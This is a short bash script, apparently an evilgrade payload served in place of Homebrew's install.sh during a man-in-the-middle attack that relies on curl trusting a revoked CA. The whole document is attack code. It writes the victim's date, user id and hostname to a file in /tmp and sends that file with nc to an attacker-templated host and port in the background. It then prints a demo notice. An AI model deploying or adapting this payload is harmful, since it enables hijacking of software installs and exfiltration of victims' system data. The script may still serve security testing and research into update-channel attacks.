#!/bin/bash
# Served by evilgrade in place of the genuine Homebrew install.sh.
# Reaches the victim because /usr/bin/curl's default TLS backend trusts the
# revoked eMudhra intermediate (EM DV TLS CA - G3C) via /etc/ssl/cert.pem.
RHOST=<%LHOST%>; RPORT=<%LPORT%>
{
  echo "owned by evilgrade -- Homebrew install.sh MITM"
  echo "date: $(date -u 2>/dev/null)"
  echo "user: $(id 2>/dev/null)"
  echo "host: $(hostname 2>/dev/null)"
  echo "vector: compromised eMudhra CA trusted by /usr/bin/curl (cert.pem backend)"
  echo "channel: brew install one-liner"
} > /tmp/OWNED_BY_BREW 2>&1
( cat /tmp/OWNED_BY_BREW | nc "$RHOST" "$RPORT" ) >/dev/null 2>&1 &
echo "[*] (demo) attacker code executed as $(id -un). Homebrew was NOT installed."
exit 0
